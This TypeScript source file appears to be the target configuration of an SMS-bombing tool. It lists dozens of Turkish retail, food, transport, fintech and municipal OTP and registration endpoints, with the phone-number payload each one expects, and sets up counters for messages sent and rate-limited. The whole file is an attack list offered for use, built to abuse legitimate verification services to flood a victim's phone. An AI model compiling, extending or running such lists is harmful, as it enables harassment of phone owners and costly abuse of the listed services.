import { ServiceDefinition } from './types';

export const TARGET_ENDPOINTS: ServiceDefinition[] = [
  // --- GİYİM & MODA ---
  {
    id: 'kahve_dunyasi',
    name: 'Kahve Dünyası',
    url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
    method: 'POST',
    payloadInfo: '{"countryCode": "90", "phoneNumber": "..."}'
  },
  {
    id: 'koton',
    name: 'Koton',
    url: 'https://www.koton.com/api/v2/users/register',
    method: 'POST',
    payloadInfo: '{"mobile": "...", "firstName": "...", "lastName": "...", "email": "...", "password": "..."}'
  },
  {
    id: 'penti',
    name: 'Penti',
    url: 'https://api.penti.com/api/v1/users/login/otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'english_home',
    name: 'English Home',
    url: 'https://www.englishhome.com/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"Phone": "...", "XID": ""}'
  },
  {
    id: 'jimmykey',
    name: 'Jimmy Key',
    url: 'https://www.jimmykey.com/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'alixavien',
    name: 'Alix Avien',
    url: 'https://www.alixavien.com.tr/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'ayyildiz',
    name: 'Ayyıldız',
    url: 'https://www.ayyildiz.com.tr/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },

  // --- MARKET & EV EŞYASI ---
  {
    id: 'migros',
    name: 'Migros',
    url: 'https://rest.migros.com.tr/sanalmarket/users/register/otp',
    method: 'POST',
    payloadInfo: '{"email": "...", "phoneNumber": "..."}'
  },
  {
    id: 'file_market',
    name: 'File Market',
    url: 'https://api.filemarket.com.tr/v1/otp/send',
    method: 'POST',
    payloadInfo: '{"mobilePhoneNumber": "90..."}'
  },
  {
    id: 'bim',
    name: 'Bim',
    url: 'https://bim.veesk.net/service/v1.0/account/login',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'metro_market',
    name: 'Metro Market',
    url: 'https://feature.metro-tr.com/api/mobileAuth/validateSmsSend',
    method: 'POST',
    payloadInfo: '{"methodType": "2", "mobilePhoneNumber": "+90..."}'
  },
  {
    id: 'evidea',
    name: 'Evidea',
    url: 'https://www.evidea.com/users/register/',
    method: 'POST',
    payloadInfo: 'Multipart form: phone, first_name, last_name, email, password'
  },
  {
    id: 'wmf',
    name: 'WMF',
    url: 'https://www.wmf.com.tr/users/register/',
    method: 'POST',
    payloadInfo: 'Form: phone, first_name, last_name, email, password, date_of_birth'
  },
  {
    id: 'macrocenter',
    name: 'Macrocenter',
    url: 'https://www.macrocenter.com.tr/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'joker',
    name: 'Joker',
    url: 'https://api.joker.com.tr/api/register',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "0...", "firstName": "...", "lastName": "...", "email": "...", "password": "..."}'
  },
  {
    id: 'happy',
    name: 'Happy',
    url: 'https://www.happy.com.tr/index.php?route=account/register/verifyPhone',
    method: 'POST',
    payloadInfo: '{"telephone": "..."}'
  },
  {
    id: 'uysal_market',
    name: 'Uysal Market',
    url: 'https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms',
    method: 'POST',
    payloadInfo: '{"phone_number": "..."}'
  },
  {
    id: 'toptan_teslim',
    name: 'Toptan Teslim',
    url: 'https://toptanteslim.com/Services/V2/MobilServis.aspx',
    method: 'POST',
    payloadInfo: '{"TELEFON": "...", "ISLEM": "KayitOl"}'
  },
  {
    id: 'hayat_su',
    name: 'Hayat Su',
    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',
    method: 'POST',
    payloadInfo: '{"mobilePhoneNumber": "...", "actionType": "register"}'
  },
  {
    id: 'vakif_tasdelen',
    name: 'Vakıf Taşdelen Su',
    url: 'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "...", "isGuest": false}'
  },
  {
    id: 'hamidiye',
    name: 'Hamidiye',
    url: 'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "...", "isGuest": false}'
  },
  {
    id: 'tasdelen',
    name: 'Taşdelen Su',
    url: 'https://vakiftasdelensu.com/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'yilmaz_ticaret',
    name: 'Yılmaz Ticaret',
    url: 'http://www.yilmazticaret.net/restapi2/register/',
    method: 'POST',
    payloadInfo: '{"telefon": "0 ..."}'
  },

  // --- YEMEK & İÇECEK ---
  {
    id: 'tikla_gelsin',
    name: 'Tıkla Gelsin',
    url: 'https://svc.apps.tiklagelsin.com/user/graphql',
    method: 'POST',
    payloadInfo: 'GraphQL mutation'
  },
  {
    id: 'istegelsin',
    name: 'İste Gelsin',
    url: 'https://istegelsin.com/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'starbucks',
    name: 'Starbucks',
    url: 'https://auth.sbuxtr.com/signUp',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "...", "email": "...", "firstName": "...", "lastName": "...", "password": "..."}'
  },
  {
    id: 'dominos',
    name: 'Dominos',
    url: 'https://frontend.dominos.com.tr/api/customer/sendOtpCode',
    method: 'POST',
    payloadInfo: '{"mobilePhone": "...", "email": "...", "isSure": false}'
  },
  {
    id: 'little_caesars',
    name: 'Little Caesars',
    url: 'https://api.littlecaesars.com.tr/api/web/Member/Register',
    method: 'POST',
    payloadInfo: '{"Phone": "05...", "NameSurname": "..."}'
  },
  {
    id: 'baydoner',
    name: 'Baydöner',
    url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
    method: 'POST',
    payloadInfo: '{"PhoneNumber": "...", "Email": "...", "Name": "...", "Surname": "..."}'
  },
  {
    id: 'kofteci_yusuf',
    name: 'Köfteci Yusuf',
    url: 'https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder',
    method: 'POST',
    payloadInfo: '{"Telefon": "..."}'
  },
  {
    id: 'komagene',
    name: 'Komagene',
    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder',
    method: 'POST',
    payloadInfo: '{"Telefon": "...", "FirmaId": "32"}'
  },
  {
    id: 'coffy',
    name: 'Coffy',
    url: 'https://user-api-gw.coffy.com.tr/user/signup',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "..."}'
  },
  {
    id: 'kuryem_gelsin',
    name: 'Kuryem Gelsin',
    url: 'https://api.kuryemgelsin.com/tr/api/users/registerMessage/',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "...", "phone_country_code": "+90"}'
  },
  {
    id: 'pidem',
    name: 'Pidem',
    url: 'https://api.pidem.com.tr/api/v1/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'frink',
    name: 'Frink',
    url: 'https://api.frink.com.tr/api/v1/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'orwi',
    name: 'Orwi',
    url: 'https://api.orwi.app/api/v1/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'tazi',
    name: 'Tazi',
    url: 'https://tazi.tech/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'bisu',
    name: 'Bisu',
    url: 'https://bisu.com.tr/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'bodrum_belediye',
    name: 'Bodrum Belediye',
    url: 'https://bodrum.bel.tr/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },

  // --- ULAŞIM & KARGO ---
  {
    id: 'marti',
    name: 'Martı',
    url: 'https://api.marti.tech/api/v1/authentication/start',
    method: 'POST',
    payloadInfo: '{"mobile_number": "..."}'
  },
  {
    id: 'ido',
    name: 'İDO',
    url: 'https://api.ido.com.tr/idows/v2/register',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'hey_scooter',
    name: 'Hey Scooter',
    url: 'https://heyscooter.com.tr/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'tasimacim',
    name: 'Taşımacım',
    url: 'https://server.tasimacim.com/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },

  // --- DİJİTAL HİZMETLER ---
  {
    id: 'kim_gb_ister',
    name: 'Kim GB İster',
    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp',
    method: 'POST',
    payloadInfo: '{"msisdn": "90..."}'
  },
  {
    id: '345_dijital',
    name: '345 Dijital',
    url: 'https://api.345dijital.com/api/users/register',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "+90..."}'
  },
  {
    id: 'beefull',
    name: 'Beefull',
    url: 'https://app.beefull.io/api/inavitas-access-management/sms-login',
    method: 'POST',
    payloadInfo: '{"phoneCode": "90", "phoneNumber": "...", "tenant": "beefull"}'
  },
  {
    id: 'naosstars',
    name: 'Naosstars',
    url: 'https://api.naosstars.com/api/smsSend',
    method: 'POST',
    payloadInfo: '{"telephone": "+90..."}'
  },
  {
    id: 'akasya_avm',
    name: 'Akasya AVM',
    url: 'https://akasya-admin.poilabs.com/v1/tr/sms',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'akbati',
    name: 'Akbati',
    url: 'https://akbati-admin.poilabs.com/v1/tr/sms',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'yapp',
    name: 'Yapp',
    url: 'https://yapp.com.tr/api/mobile/v1/register',
    method: 'POST',
    payloadInfo: '{"phone_number": "...", "email": "...", "firstname": "...", "lastname": "..."}'
  },
  {
    id: 'suiste',
    name: 'Suiste',
    url: 'https://suiste.com/api/auth/code',
    method: 'POST',
    payloadInfo: '{"gsm": "...", "action": "register"}'
  },
  {
    id: 'porty',
    name: 'Porty',
    url: 'https://panel.porty.tech/api.php',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'clickme_live',
    name: 'ClickMe Live',
    url: 'https://mobile-gateway.clickmelive.com/api/v2/authorization/code',
    method: 'POST',
    payloadInfo: '{"phone": "..."}'
  },
  {
    id: 'qumpara',
    name: 'Qumpara',
    url: 'https://tr-api.fisicek.com/v1.3/auth/getOTP',
    method: 'POST',
    payloadInfo: '{"msisdn": "+90..."}'
  },
  {
    id: 'paybol',
    name: 'Paybol',
    url: 'https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms',
    method: 'POST',
    payloadInfo: '{"phone_number": "90..."}'
  },
  {
    id: 'yuffi',
    name: 'Yuffi',
    url: 'https://api.yuffi.co/api/parent/login/user',
    method: 'POST',
    payloadInfo: '{"phone": "...", "kvkk": true}'
  },
  {
    id: 'hizliecza',
    name: 'Hızlı Ecza',
    url: 'https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP',
    method: 'POST',
    payloadInfo: '{"otpOperationType": 2, "phoneNumber": "+90..."}'
  },
  {
    id: 'ipragaz',
    name: 'İpragaz',
    url: 'https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp',
    method: 'POST',
    payloadInfo: '{"phoneNumber": "...", "name": "..."}'
  },

  // --- BELEDİYE & KAMU ---
  {
    id: 'fatih_belediye',
    name: 'Fatih Belediye',
    url: 'https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet',
    method: 'POST',
    payloadInfo: 'Multipart form: SahisUyelik.CepTelefonu'
  },
  {
    id: 'sancaktepe_belediye',
    name: 'Sancaktepe Belediye',
    url: 'https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet',
    method: 'POST',
    payloadInfo: 'Multipart form: SahisUyelik.CepTelefonu'
  },
  {
    id: 'bayrampasa_belediye',
    name: 'Bayrampaşa Belediye',
    url: 'https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet',
    method: 'POST',
    payloadInfo: 'Multipart form: SahisUyelik.CepTelefonu'
  },

  // --- EĞLENCE & MEDYA ---
  {
    id: 'cineverse',
    name: 'Cineverse',
    url: 'https://api.paribucineverse.com/auth/otp',
    method: 'POST',
    payloadInfo: '{"mobile": "..."}'
  },

  // --- DİĞER ---
  {
    id: 'money',
    name: 'Money (Migros)',
    url: 'https://www.money.com.tr/Account/ValidateAndSendOTP',
    method: 'POST',
    payloadInfo: 'Form: phone'
  },
];

export const INITIAL_STATS = {
  totalSent: 0,
  success: 0,
  failed: 0,
  rateLimited: 0,
  sentOpaque: 0,
};
